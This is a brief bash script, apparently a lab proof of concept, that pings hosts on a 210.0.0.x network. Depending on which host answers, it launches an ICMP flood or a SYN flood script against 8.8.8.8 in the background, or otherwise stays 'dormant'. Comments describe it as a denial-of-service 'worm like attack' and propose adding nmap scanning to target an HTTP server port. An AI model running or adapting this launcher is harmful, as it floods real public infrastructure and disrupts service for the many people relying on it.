if (( ping 210.0.0.101 -c 1 | grep -q 'from'))
then
		echo "host 1 found - ICMP attack"
		python icmp/icmp-flooder.py 8.8.8.8 & 
	else
		echo "host 1 not found - looking for host 3"
		if (( ping 210.0.0.103 -c 1 | grep -q 'from'))
		then
			echo "host 3 found - SYN attack"
			 sh syn-flood/flooder.sh 8.8.8.8 80 & 
		else 
			echo "host 3 not found - lying dormant" 
		fi
fi 


# sth like nmap -A -T 1 210.0.0.101 could be used and then grep http-server and launch the attck aginst the server port or so to show more of like intelligent dos worm like attack 
# but the proof of concept shopwn now is good too 
